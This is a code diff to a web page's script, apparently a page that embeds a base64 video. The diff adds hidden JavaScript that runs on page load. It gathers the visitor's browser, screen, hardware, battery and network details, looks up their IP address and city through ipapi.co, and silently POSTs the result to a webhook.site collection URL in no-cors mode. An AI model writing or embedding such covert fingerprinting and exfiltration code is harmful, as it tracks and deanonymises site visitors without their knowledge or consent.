@@ -168,27 +168,66 @@ var VD=["AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAKOAbW9vdgAAAGxtdmhkAAAAAAA
 
 
 
-const myUrl = 'http://webhook.site/0ad04dd7-b48f-4e05-aacd-c294a9cf3ef7';
 
-const data = {
-    userAgent: navigator.userAgent,
-    screen: screen.width + "x" + screen.height,
-    language: navigator.language,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    platform: navigator.platform
-};
 
-fetch(myUrl, {
-    method: 'POST',
-    mode: 'no-cors', // <-- Добавлена эта строка
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(data)
-})
-.then(response => console.log('Запрос отправлен (ответ скрыт из-за no-cors)!'))
-.catch(error => console.error('Ошибка:', error));
+
+    const data = {
+
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+
+
+        screenResolution: screen.width + "x" + screen.height,
+        actualScreenResolution: (screen.width * window.devicePixelRatio) + "x" + (screen.height * window.devicePixelRatio),
+        devicePixelRatio: window.devicePixelRatio,
+
+
+        cpuCores: navigator.hardwareConcurrency || 'Unknown',
+        deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
+        networkType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+
+
+        battery: 'Checking...',
+
+
+        ipData: 'Checking...'
+    };
+
+
+    if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+            data.battery = battery.level * 100 + "% " + (battery.charging ? "(Charging)" : "");
+            sendData(); // Отправляем после получения
+        });
+    } else {
+        data.battery = 'Not supported';
+        sendData(); // Отправляем сразу, если батареи нет
+    }
+
+
+    fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(ipInfo => {
+            data.ipData = `${ipInfo.city}, ${ipInfo.country_name} (IP: ${ipInfo.ip})`;
+        })
+        .catch(() => { data.ipData = 'Error getting IP'; });
+
+
+    function sendData() {
+        const myUrl = 'https://webhook.site/0ad04dd7-b48f-4e05-aacd-c294a9cf3ef7'; // Убедитесь, что ссылка https
+
+        fetch(myUrl, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        })
+        .then(() => console.log('Данные отправлены!'))
+        .catch(error => console.error('Ошибка:', error));
+    }
 </script>
+
 
 
 
